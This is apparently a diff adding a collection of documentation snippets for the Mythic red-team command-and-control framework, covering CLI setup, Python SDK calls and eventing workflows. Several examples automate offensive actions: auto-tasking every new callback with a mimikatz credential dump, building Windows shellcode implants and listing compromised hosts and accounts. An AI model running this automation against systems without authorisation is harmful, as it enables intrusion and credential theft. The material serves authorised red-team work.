@@ -1,0 +1,1840 @@
+### Start Development Server with npm run react-start
+
+Source: https://github.com/its-a-feature/mythic/blob/master/MythicReactUI/README.md
+
+This command builds the UI and starts the internal development server. Changes made to the code will be reflected in the UI in real-time.
+
+```bash
+npm run react-start
+```
+
+--------------------------------
+
+### Create Task with Dependencies and Outputs
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/EventingExamples/runCommandsOnNewCallback.ipynb
+
+This snippet outlines the structure for creating a task that may have dependencies on other tasks and can produce outputs. The example focuses on the setup for `callback_display_id` and `params_dictionary`.
+
+```yaml
+- name: "run script"
+    description: "run the HealthInspector script"
+    inputs:
+      CALLBACK_ID: env.display_id
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID
+      params_dictionary:
+
+```
+
+--------------------------------
+
+### Install Agent from GitHub using Mythic CLI
+
+Source: https://github.com/its-a-feature/mythic/blob/master/README.md
+
+Use this command to install agents into your Mythic instance by providing the GitHub repository URL. The `-b` flag specifies a branch, and `-f` forces the installation.
+
+```bash
+sudo ./mythic-cli install github https://github.com/MythicAgents/apfell
+```
+
+--------------------------------
+
+### Install C2 Profile from GitHub using Mythic CLI
+
+Source: https://github.com/its-a-feature/mythic/blob/master/README.md
+
+This command installs C2 profiles into your Mythic instance. Provide the GitHub repository URL for the profile. Similar to agent installation, branch and force options are available.
+
+```bash
+sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
+```
+
+--------------------------------
+
+### Start or Stop C2 Profile
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/C2Profiles.ipynb
+
+This function allows you to start or stop a specified C2 profile. You need to provide the Mythic instance object, the name of the C2 profile, and the action to perform ('start' or 'stop').
+
+```APIDOC
+## start_stop_c2_profile
+
+### Description
+Starts or stops a C2 profile.
+
+### Method Signature
+`await mythic.start_stop_c2_profile(mythic: MythicInstance, c2_profile_name: str, action: str)`
+
+### Parameters
+#### Path Parameters
+* `mythic` (MythicInstance) - The Mythic instance object.
+* `c2_profile_name` (str) - The name of the C2 profile to manage.
+* `action` (str) - The action to perform, either 'start' or 'stop'.
+
+### Request Example
+```python
+resp = await mythic.start_stop_c2_profile(mythic=mythic_instance, c2_profile_name="http", action="start")
+print(resp)
+resp = await mythic.start_stop_c2_profile(mythic=mythic_instance, c2_profile_name="http", action="stop")
+print(resp)
+```
+```
+
+--------------------------------
+
+### Track Installed Service Locations
+
+Source: https://github.com/its-a-feature/mythic/blob/master/Mythic_CLI/Changelog.md
+
+Supports tracking an installed service's `install_location`. Commands like `mythic-cli update --all-services` and `mythic-cli update --services [name] [name]` can check for updated remote images.
+
+```bash
+mythic-cli update --all-services
+```
+
+```bash
+mythic-cli update --services [name] [name]
+```
+
+--------------------------------
+
+### Start or Stop a C2 Profile
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/C2Profiles.ipynb
+
+Controls the lifecycle of a C2 profile. Use 'start' to enable a profile and 'stop' to disable it. The C2 profile name must match an existing profile in Mythic.
+
+```python
+# ########## Start or Stop C2 Profile ###########
+resp = await mythic.start_stop_c2_profile(mythic=mythic_instance, c2_profile_name="http", action="start")
+print(resp)
+resp = await mythic.start_stop_c2_profile(mythic=mythic_instance, c2_profile_name="http", action="stop")
+print(resp)
+```
+
+--------------------------------
+
+### Control Volume Persistence in Mythic CLI
+
+Source: https://github.com/its-a-feature/mythic/blob/master/Mythic_CLI/Changelog.md
+
+The `--keep-volume` flag can be used with `start`, `build`, and `install` commands to override the default behavior of removing volumes. By default, volumes are removed when containers start if `rebuild_on_start` is true, and on explicit `build` commands.
+
+```bash
+mythic-cli start --keep-volume
+```
+
+```bash
+mythic-cli build --keep-volume
+```
+
+```bash
+mythic-cli install --keep-volume
+```
+
+--------------------------------
+
+### Get All Processes
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Processes.ipynb
+
+Retrieves all processes across all hosts with a configurable batch size.
+
+```APIDOC
+## get_all_processes (batch_size)
+
+### Description
+Retrieves all processes across all hosts.
+
+### Parameters
+#### Path Parameters
+- **mythic** (object) - Required - The Mythic instance object.
+- **batch_size** (integer) - Optional - The number of processes to retrieve in each batch.
+
+#### Query Parameters
+None
+
+### Request Body
+None
+
+### Response
+#### Success Response (200)
+- **data** (list) - A list of process objects.
+
+### Response Example
+```json
+{
+  "example": "[process_object_1, process_object_2]"
+}
+```
+```
+
+--------------------------------
+
+### Subscribe to All Tasks (Old and New)
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Tasking.ipynb
+
+Retrieves all existing tasks and then subscribes to new tasks for a given callback. This example limits results to one per task.
+
+```python
+# ################ get all old tasks and subscribe to all new tasks ################
+# only get up to 1 result for each task
+async for result in mythic.subscribe_all_tasks(mythic=mythic_instance, callback_display_id=9, timeout=30):
+    print(result)
+```
+
+--------------------------------
+
+### Get All Processes
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Processes.ipynb
+
+Retrieves a list of all processes across all connected hosts. Data is fetched in batches for performance.
+
+```python
+# ################ get processes################
+async for data in mythic.get_all_processes(mythic=mythic_instance, batch_size=10):
+    print(f"Got data! {data}\n")
+```
+
+--------------------------------
+
+### Get All Downloaded Files
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Files.ipynb
+
+Retrieves metadata for all files that have been downloaded.
+
+```APIDOC
+## get_all_downloaded_files
+
+### Description
+Fetches metadata for all files that have been downloaded through Mythic.
+
+### Method
+`mythic.get_all_downloaded_files(mythic)`
+
+### Parameters
+- **mythic**: An authenticated Mythic instance.
+
+### Response Example
+(This is an async generator yielding metadata objects for each downloaded file)
+```
+
+--------------------------------
+
+### Create Task with String Inputs
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/EventingExamples/runCommandsOnNewCallback.ipynb
+
+Defines an action to create a task on a callback. It uses environment variables like `env.display_id` for the callback ID and allows specifying command and parameters. This is a basic example of task creation.
+
+```yaml
+- name: "issue whoami"
+    description:
+    inputs:
+      CALLBACK_ID: env.display_id <-- notice this gets the display_id of the callback that triggered this event
+      COMMAND: shell <-- this could be hardcoded in the action_data, but left here as a simple example
+    action: task_create
+    action_data: <-- the actual data associated with this action, task_create
+      callback_display_id: CALLBACK_ID <-- this gets replaced based on our inputs
+      params: whoami
+      command_name: COMMAND <-- this gets replaced based on our inputs
+```
+
+--------------------------------
+
+### Update Services with Auto-Install Flag
+
+Source: https://github.com/its-a-feature/mythic/blob/master/Mythic_CLI/Changelog.md
+
+The `update` command now includes an `-i` flag for `update -s [service]` and `update -a` to automatically install updates for services.
+
+```bash
+mythic-cli update -s [service]
+```
+
+```bash
+update -a
+```
+
+--------------------------------
+
+### Set Default Volume Usage for Services
+
+Source: https://github.com/its-a-feature/mythic/blob/master/Mythic_CLI/Changelog.md
+
+The default value for an installed service's `*_use_volume` setting is now `false` instead of `true` to mitigate issues with lingering volumes. Users must explicitly set this if needed.
+
+```bash
+service_name_use_volume=true
+```
+
+--------------------------------
+
+### Get All Task Output
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Tasking.ipynb
+
+Retrieves all task output for the entire operation.
+
+```APIDOC
+## get_all_task_output
+
+### Description
+Retrieves all task output for the entire operation.
+
+### Method
+`mythic.get_all_task_output(
+    mythic: MythicInstance
+)`
+
+### Parameters
+- **mythic** (MythicInstance) - The authenticated Mythic instance object.
+
+### Response Example
+```
+[
+  {
+    "output": "<task_output_string>",
+    "task_id": <task_id>,
+    "id": <output_id>
+  },
+  ...
+]
+```
+```
+
+--------------------------------
+
+### Get All Callbacks
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Callbacks.ipynb
+
+Retrieves a list of all callbacks currently registered in the Mythic system.
+
+```APIDOC
+## Get All Callbacks
+
+### Description
+Retrieves a list of all callbacks currently registered in the Mythic system.
+
+### Method
+`mythic.get_all_callbacks`
+
+### Parameters
+- **mythic** (object) - Required - The Mythic instance object.
+
+### Response
+#### Success Response (200)
+- **callbacks** (list) - A list of callback objects.
+```
+
+--------------------------------
+
+### Get All Callbacks
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Callbacks.ipynb
+
+Retrieves a list of all callbacks currently registered in Mythic. The output will be printed to the console.
+
+```python
+# ################ Get all callbacks ################
+callbacks = await mythic.get_all_callbacks(mythic=mythic_instance)
+print(callbacks)
+```
+
+--------------------------------
+
+### Get All Task Output by Specific ID
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Tasking.ipynb
+
+Retrieves all output for a single, specified task ID. This is a more targeted approach than getting all operation output.
+
+```python
+# ################ Get all task output a single task ################
+responses = await mythic.get_all_task_output_by_id(mythic=mythic_instance, task_display_id=25)
+print(responses)
+```
+
+--------------------------------
+
+### Get All Task Output for Operation
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Tasking.ipynb
+
+Retrieves all task output across the entire Mythic operation. This is useful for a comprehensive review.
+
+```python
+# ################ Get all task output for entire operation ################
+responses = await mythic.get_all_task_output(mythic=mythic_instance)
+print(responses)
+```
+
+--------------------------------
+
+### Get All Uploaded Files
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Files.ipynb
+
+Retrieves metadata for all files that have been uploaded to Mythic.
+
+```APIDOC
+## get_all_uploaded_files
+
+### Description
+Fetches metadata for all files that have been uploaded to Mythic.
+
+### Method
+`mythic.get_all_uploaded_files(mythic)`
+
+### Parameters
+- **mythic**: An authenticated Mythic instance.
+
+### Response Example
+(This is an async generator yielding metadata objects for each uploaded file)
+```
+
+--------------------------------
+
+### Get All Screenshots
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Files.ipynb
+
+Retrieves metadata for all screenshots captured and stored in Mythic.
+
+```APIDOC
+## get_all_screenshots
+
+### Description
+Fetches metadata for all screenshots managed by Mythic.
+
+### Method
+`mythic.get_all_screenshots(mythic)`
+
+### Parameters
+- **mythic**: An authenticated Mythic instance.
+
+### Response Example
+(This is an async generator yielding metadata objects for each screenshot)
+```
+
+--------------------------------
+
+### Get All Tag Types
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Tags.ipynb
+
+Retrieves a list of all available tag types.
+
+```APIDOC
+## Get All Tag Types
+
+### Description
+Retrieves a list of all tag types configured in Mythic.
+
+### Method
+`mythic.get_all_tag_types`
+
+### Parameters
+- **mythic** (object) - Required - The Mythic instance object.
+
+### Response
+#### Success Response (200)
+- A list of tag type objects, each containing:
+  - **id** (integer) - The unique identifier for the tag type.
+  - **color** (string) - The color of the tag type.
+  - **description** (string) - The description of the tag type.
+  - **name** (string) - The name of the tag type.
+
+### Request Example
+```python
+resp = await mythic.get_all_tag_types(mythic=mythic_instance)
+```
+
+### Response Example
+```json
+[
+  {
+    "id": 1,
+    "color": "#71a0d0",
+    "description": "test",
+    "name": "name"
+  }
+]
+```
+```
+
+--------------------------------
+
+### Get All Operations
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/OperatorsAndOperations.ipynb
+
+Retrieves a list of all operations and their associated operators.
+
+```APIDOC
+## Get All Operations
+
+### Description
+Retrieves a list of all operations, including their ID, name, and associated operators with their IDs and usernames.
+
+### Method
+`GET`
+
+### Endpoint
+`/mythic/api/v1/operations`
+
+### Query Parameters
+- **custom_return_attributes** (string) - Optional - Specifies the fields to return for operations and their operators. Example: `name, id, operators { id, username }`
+```
+
+--------------------------------
+
+### Add Additional Services to Config
+
+Source: https://github.com/its-a-feature/mythic/blob/master/Mythic_CLI/Changelog.md
+
+Allows specifying additional services to install via the `additional_services` keyword in `config.json`. Supports GitHub URLs with optional branch specification or local paths.
+
+```json
+"additional_services": {"http": "https://github.com/MythicC2Profiles/http" }
+```
+
+```json
+"additional_services": {"http": "https://github.com/MythicC2Profiles/http branchName" }
+```
+
+--------------------------------
+
+### Get All Operations with Custom Attributes
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/OperatorsAndOperations.ipynb
+
+Retrieves a list of all operations, including specified custom attributes like name, ID, and associated operators. This is useful for getting a detailed overview of the operational landscape.
+
+```python
+# ################ Get all Operations and their members ################
+
+operations = await mythic.get_operations(
+        mythic=mythic_instance,
+        custom_return_attributes="""
+        name
+        id
+        operators {
+            id
+            username
+        }
+    """,
+)
+print(operations)
+```
+
+--------------------------------
+
+### Get All Tasks
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Tasking.ipynb
+
+Retrieves all tasks, optionally filtered by a specific callback ID.
+
+```APIDOC
+## get_all_tasks
+
+### Description
+Retrieves all tasks, optionally filtered by a specific callback ID.
+
+### Method
+`mythic.get_all_tasks(
+    mythic: MythicInstance,
+    callback_display_id: int = None
+)`
+
+### Parameters
+- **mythic** (MythicInstance) - The authenticated Mythic instance object.
+- **callback_display_id** (int, optional) - The display ID of the callback to filter tasks by. If None, all tasks are returned.
+
+### Response Example
+```
+[
+  {
+    "id": <task_id>,
+    "display_id": <display_id>,
+    "callback_id": <callback_id>,
+    "command": "<command_name>",
+    "status": "<task_status>",
+    ...
+  },
+  ...
+]
+```
+```
+
+--------------------------------
+
+### Get Metadata for All Downloaded Files
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Files.ipynb
+
+Retrieves metadata for all files that have been downloaded through Mythic. This returns an asynchronous iterator.
+
+```python
+# ################ Get metadata about all downloaded files ################
+async for downloaded_file in mythic.get_all_downloaded_files(mythic=mythic_instance):
+    print(downloaded_file)
+```
+
+--------------------------------
+
+### Get All Processes on a Specific Host
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Processes.ipynb
+
+Retrieves all processes running on a specified host with a configurable batch size.
+
+```APIDOC
+## get_all_processes (host, batch_size)
+
+### Description
+Retrieves all processes on a specified host.
+
+### Parameters
+#### Path Parameters
+- **mythic** (object) - Required - The Mythic instance object.
+- **host** (string) - Required - The hostname to retrieve processes from.
+- **batch_size** (integer) - Optional - The number of processes to retrieve in each batch.
+
+#### Query Parameters
+None
+
+### Request Body
+None
+
+### Response
+#### Success Response (200)
+- **data** (list) - A list of process objects.
+
+### Response Example
+```json
+{
+  "example": "[process_object_1, process_object_2]"
+}
+```
+```
+
+--------------------------------
+
+### Subscribe to New Tasks on a Callback
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Tasking.ipynb
+
+Subscribes to receive new tasks as they are issued to a specific callback. This example limits results to one per new task and includes a timeout.
+
+```python
+# ################ subscribe to new tasks on all callbacks or a single callback with timeout ################
+# only get up to 1 result for each new task
+async for result in mythic.subscribe_new_tasks(mythic=mythic_instance, callback_display_id=9, timeout=10):
+    print(result)
+```
+
+--------------------------------
+
+### Payload Creation Action
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/EventingExamples/cronEventing.ipynb
+
+Configures an action to create a payload. This example specifies an Apollo payload with shellcode output, WebSocket C2 profile, and includes 'shell', 'exit', and 'load' commands.
+
+```yaml
+name: "apollo bin"
+description: "generate shellcode"
+action: "payload_create"
+action_data:
+  payload_type: "apollo"
+  description: "apollo test payload shellcode"
+  selected_os: "Windows"
+  build_parameters:
+  - name: "output_type"
+    value: "Shellcode"
+  filename: "apollo.bin"
+  c2_profiles:
+  - c2_profile: "websocket"
+    c2_profile_parameters:
+      AESPSK: "aes256_hmac"
+      callback_host: "ws://192.168.0.118"
+      tasking_type: "Push"
+  commands:
+  - shell
+  - exit
+  - load
+outputs:
+  PayloadUUID: "uuid"
+```
+
+--------------------------------
+
+### Get All Processes on a Specific Host
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Processes.ipynb
+
+Retrieves a list of all processes currently running on a specified host. Uses batching for efficient data retrieval.
+
+```python
+# ################ get processes on host ################
+async for data in mythic.get_all_processes(mythic=mythic_instance, host="SPOOKY.LOCAL", batch_size=10):
+    print(f"Got data! {data}\n")
+```
+
+--------------------------------
+
+### Get All Payloads
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Payloads.ipynb
+
+Retrieve a list of all payloads currently registered on the Mythic server.
+
+```python
+# ################ Get all payloads ################
+payloads = await mythic.get_all_payloads(mythic=mythic_instance)
+print(payloads)
+```
+
+--------------------------------
+
+### Custom File Metadata Subscription
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/CustomQueries.ipynb
+
+Subscribes to real-time file metadata events from Mythic. This example uses a custom GraphQL subscription query to receive updates.
+
+```python
+# ################ Custom subscription ################
+my_custom_process_subscription = """
+subscription myFilemetaSubscription {
+     filemeta_stream(cursor: {initial_value: {id: 1}}, batch_size: 1) {
+         filename_utf8
+         full_remote_path_utf8
+         host
+         complete
+         id
+         md5
+         sha1
+         timestamp
+         task {
+             callback {
+                 agent_callback_id
+                 payload {
+                     uuid
+                     os
+                     payloadtype {
+                         name
+                     }
+                 }
+             }
+         }
+     }
+ } 
+ """
+async for data in mythic.subscribe_custom_query(
+     mythic=mythic_instance, query=my_custom_process_subscription, timeout=10
+ ):
+    # do something with the data
+    print(f"[*] Got Process data:\n{data}\n")
+```
+
+--------------------------------
+
+### Subscribe to New Callbacks and Issue Tasks
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Callbacks.ipynb
+
+Listens for new callbacks created after the function starts and issues 'mimikatz' and 'shell' commands to them. Uses a batch size of 1 for processing.
+
+```python
+# ################ Subscribe new callbacks with timeout ################
+# only get new callbacks created since running this function
+async for c in mythic.subscribe_new_callbacks(mythic=mythic_instance, batch_size=1):
+    resp = await mythic.issue_task(
+       mythic=mythic_instance,
+       command_name="mimikatz",
+       parameters="sekurlsa::logonpasswords",
+       callback_display_id=c[0]["display_id"],
+        wait_for_complete=False,
+    )
+    print(resp)
+    resp = await mythic.issue_task(
+       mythic=mythic_instance,
+       command_name="shell",
+       parameters="whoami",
+       callback_display_id=c[0]["display_id"],
+        wait_for_complete=False,
+    )
+    print(resp)
+```
+
+--------------------------------
+
+### Subscribe to New Tasks and Updates on a Callback
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Tasking.ipynb
+
+Subscribes to receive new tasks and any subsequent updates (e.g., processing stages) for a specific callback. This example allows multiple results per task and has a longer timeout.
+
+```python
+# ################ subscribe to new tasks (and updates) on all callbacks or a single callback with timeout ################
+# get multiple results for each task as it goes through various processing stages
+async for result in mythic.subscribe_new_tasks_and_updates(mythic=mythic_instance, callback_display_id=9, timeout=30):
+    print(result)
+```
+
+--------------------------------
+
+### Get All Commands for a Payload Type
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Payloads.ipynb
+
+Fetch all available commands associated with a specific payload type from the Mythic server.
+
+```python
+# ################ Get all commands for a payload type ################
+resp = await mythic.get_all_commands_for_payloadtype(mythic=mythic_instance, payload_type_name="poseidon")
+print(resp)
+```
+
+--------------------------------
+
+### Get Active Callbacks
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Callbacks.ipynb
+
+Retrieves a list of all currently active callbacks in the Mythic system.
+
+```APIDOC
+## Get Active Callbacks
+
+### Description
+Retrieves a list of all currently active callbacks in the Mythic system.
+
+### Method
+`mythic.get_all_active_callbacks`
+
+### Parameters
+- **mythic** (object) - Required - The Mythic instance object.
+
+### Response
+#### Success Response (200)
+- **callbacks** (list) - A list of active callback objects.
+```
+
+--------------------------------
+
+### Drop Support for docker-compose Script
+
+Source: https://github.com/its-a-feature/mythic/blob/master/Mythic_CLI/Changelog.md
+
+Dropped support for the `docker-compose` script due to issues in Kali. Users should ensure the `compose` plugin is installed with Docker.
+
+```bash
+docker compose plugin
+```
+
+--------------------------------
+
+### Get Unique Compromised Host Information
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Misc.ipynb
+
+Retrieve lists of unique compromised hosts, accounts, and IP addresses from the Mythic instance.
+
+```python
+# ########## Get Compromised Hosts, Users, IP Addresses ###########
+
+hosts = await mythic.get_unique_compromised_hosts(mythic=mythic_instance)
+print(hosts)
+users = await mythic.get_unique_compromised_accounts(mythic=mythic_instance)
+print(users)
+ips = await mythic.get_unique_compromised_ips(mythic=mythic_instance)
+print(ips)
+```
+
+--------------------------------
+
+### Update ENV Variables for Services
+
+Source: https://github.com/its-a-feature/mythic/blob/master/Mythic_CLI/Changelog.md
+
+The system now loops over installed services and updates their ENV variables as necessary when run, not just on add. This includes support for `rabbitmq_vhost` in containers.
+
+```bash
+rabbitmq_vhost=/mythic
+```
+
+--------------------------------
+
+### Get File Browser Data on All Hosts
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Filebrowser.ipynb
+
+Retrieves file browser data from all hosts. Specify a batch size for efficient retrieval.
+
+```python
+# ################ Get file browser data on all hosts ################
+async for data in mythic.get_all_filebrowser(mythic=mythic_instance, batch_size=10):
+    print(f"Got data! {data}\n")
+```
+
+--------------------------------
+
+### Get All Task Output by ID
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Tasking.ipynb
+
+Retrieves all output associated with a specific task ID.
+
+```APIDOC
+## get_all_task_output_by_id
+
+### Description
+Retrieves all output associated with a specific task ID.
+
+### Method
+`mythic.get_all_task_output_by_id(
+    mythic: MythicInstance,
+    task_display_id: int
+)`
+
+### Parameters
+- **mythic** (MythicInstance) - The authenticated Mythic instance object.
+- **task_display_id** (int) - The display ID of the task.
+
+### Response Example
+```
+[
+  {
+    "output": "<task_output_string>",
+    "task_id": <task_id>,
+    "id": <output_id>
+  },
+  ...
+]
+```
+```
+
+--------------------------------
+
+### Get Tag Type by Name
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Tags.ipynb
+
+Retrieves a specific tag type by its name.
+
+```APIDOC
+## Get Tag Type by Name
+
+### Description
+Retrieves a specific tag type by its name.
+
+### Method
+`mythic.get_tag_type`
+
+### Parameters
+- **mythic** (object) - Required - The Mythic instance object.
+- **name** (string) - Required - The name of the tag type to search for.
+
+### Response
+#### Success Response (200)
+- **id** (integer) - The unique identifier for the tag type.
+- **color** (string) - The color of the tag type.
+- **description** (string) - The description of the tag type.
+- **name** (string) - The name of the tag type.
+
+### Request Example
+```python
+resp = await mythic.get_tag_type(mythic=mythic_instance, name="name")
+```
+
+### Response Example
+```json
+[
+  {
+    "id": 1,
+    "color": "#71a0d0",
+    "description": "test",
+    "name": "name"
+  }
+]
+```
+```
+
+--------------------------------
+
+### Response Intercept Action Configuration
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/EventingExamples/responseIntercept.ipynb
+
+This is a configuration example for a response intercept action. It specifies the container to use for processing the intercepted output. This action is triggered when a task sends user output back to Mythic.
+
+```yaml
+#  - name: "output enhancement"
+#    description: "augment shell output with more data"
+#    action: "response_intercept"
+#    action_data:
+#      container_name: "opsecChecker" <-- this example is in the ExampleContainers repo
+#          ^ the input env.* context here is the task that resulted in this output. This is called each time that task sends user_output back to Mythic
+#            this can be called many times per task
+```
+
+--------------------------------
+
+### Get Active Callbacks
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Callbacks.ipynb
+
+Retrieves a list of all currently active callbacks. The output will be printed to the console.
+
+```python
+# ################ Get active callbacks ################
+callbacks = await mythic.get_all_active_callbacks(mythic=mythic_instance)
+print(callbacks)
+```
+
+--------------------------------
+
+### Get Metadata for All Screenshots
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Files.ipynb
+
+Retrieves metadata for all screenshots captured and stored within Mythic. This returns an asynchronous iterator.
+
+```python
+# ################ Get metadata about all downloaded screenshots ################
+async for screenshot in mythic.get_all_screenshots(mythic=mythic_instance):
+    print(screenshot)
+```
+
+--------------------------------
+
+### Get Metadata for All Uploaded Files
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Files.ipynb
+
+Retrieves metadata for all files that have been uploaded to Mythic. This returns an asynchronous iterator.
+
+```python
+# ################ Get metadata about all uploaded files ################
+async for upload in mythic.get_all_uploaded_files(mythic=mythic_instance):
+    print(upload)
+```
+
+--------------------------------
+
+### Get All Task and Subtask Output by ID
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Tasking.ipynb
+
+Retrieves all task output for a specified task and all of its subtasks.
+
+```APIDOC
+## get_all_task_and_subtask_output_by_id
+
+### Description
+Retrieves all task output for a specified task and all of its subtasks.
+
+### Method
+`mythic.get_all_task_and_subtask_output_by_id(
+    mythic: MythicInstance,
+    task_display_id: int
+)`
+
+### Parameters
+- **mythic** (MythicInstance) - The authenticated Mythic instance object.
+- **task_display_id** (int) - The display ID of the task.
+
+### Response Example
+```
+[
+  {
+    "output": "<task_output_string>",
+    "task_id": <task_id>,
+    "id": <output_id>
+  },
+  ...
+]
+```
+```
+
+--------------------------------
+
+### Get All Tasks for a Callback
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Tasking.ipynb
+
+Fetches a list of all tasks associated with a specific callback ID. This can be used to review past activity.
+
+```python
+# ################ Get all tasks (optionally limited to a certain callback) ################
+resp = await mythic.get_all_tasks(mythic=mythic_instance, callback_display_id=6)
+print(resp)
+```
+
+--------------------------------
+
+### Import Mythic SDK
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Payloads.ipynb
+
+Import the necessary mythic library to begin.
+
+```python
+from mythic import mythic
+```
+
+--------------------------------
+
+### Get Specific Operation
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/OperatorsAndOperations.ipynb
+
+Retrieves details for a specific operation using a custom GraphQL query.
+
+```APIDOC
+## Get Specific Operation
+
+### Description
+Retrieves details for a specific operation by name, including its ID, name, and associated operators.
+
+### Method
+`POST`
+
+### Endpoint
+`/mythic/api/v1/graphql`
+
+### Request Body
+- **query** (string) - Required - The GraphQL query to fetch the specific operation. Example: `query specificOperation { operation(where: {name: {_eq: "Operation Chimera"}}) { id name operators { id username } } }`
+```
+
+--------------------------------
+
+### Build UI with npm run react-build
+
+Source: https://github.com/its-a-feature/mythic/blob/master/MythicReactUI/README.md
+
+Use this command to build the UI for production. The output files will be placed in the \"/app/build\" folder.
+
+```bash
+npm run react-build
+```
+
+--------------------------------
+
+### Create Task with Dictionary Parameters and File Inputs
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/EventingExamples/runCommandsOnNewCallback.ipynb
+
+Demonstrates creating a task using a dictionary for parameters and referencing workflow files. `workflow.*` allows access to files uploaded with the workflow, providing a way to execute scripts or use custom data.
+
+```yaml
+- name: "import script"
+    description: "import the HealthInspector script into the callback"
+    inputs:
+      CALLBACK_ID: env.display_id <-- env.display_id gets the display_id from the triggering callback
+      FILE_ID: workflow.HealthInspector.js <-- workflow.* gets the agent_file_id associated with files uploaded as part of the workflow
+               ^ click the paperclip icon when viewing a workflow to upload / manage files to use with it
+    action: task_create
+    action_data:
+      callback_display_id: CALLBACK_ID <-- repalced based on our inputs
+      params_dictionary: <-- notice this is params_dictionary instead of just params, now we can provide non-ambiguous parameters 
+        file_id: FILE_ID <-- replaced based on our inputs
+      command_name: jsimport
+```
+
+--------------------------------
+
+### Get All File Browser Data on All Hosts
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/Filebrowser.ipynb
+
+Retrieves all available file browser data from all connected hosts in batches. This allows for a comprehensive fetch of file browser states across the entire Mythic deployment.
+
+```APIDOC
+## get_all_filebrowser (no host specified)
+
+### Description
+Gets all file browser data across all hosts. This is a generator that yields data in batches.
+
+### Parameters
+#### Path Parameters
+- **mythic** (MythicInstance) - Required - An authenticated Mythic instance object.
+- **batch_size** (int) - Optional - The number of items to retrieve in each batch. Defaults to 10.
+
+### Response
+#### Success Response (yields data)
+- **data** (list) - A list of dictionaries, where each dictionary represents file browser data from any host.
+
+### Request Example
+```python
+async for data in mythic.get_all_filebrowser(mythic=mythic_instance, batch_size=10):
+    print(f"Got data! {data}\n")
+```
+```
+
+--------------------------------
+
+### Login to Mythic Instance
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/MythicExamples/CustomQueries.ipynb
+
+Establishes a connection to the Mythic server. Ensure your server IP, port, and credentials are correct.
+
+```python
+from mythic import mythic
+
+mytic_instance = await mythic.login(
+        username="mythic_admin",
+        password="mythic_password",
+        server_ip="mythic_nginx",
+        server_port=7443,
+        timeout=-1
+    )
+```
+
+--------------------------------
+
+### Login to Mythic Instance
+
+Source: https://github.com/its-a-feature/mythic/blob/master/jupyter-docker/jupyter/EventingExamples/buildPayloadsAndWrappers.ipynb
+
+Establishes a connection to the Mythic server. Ensure server IP, port, username, and password are correctly configured.
+
+```python
+from mythic import mythic
+
+mythic_instance = await mythic.login(
+        username="mythic_admin",
+        password="mythic_password",
+        server_ip="mythic_nginx",
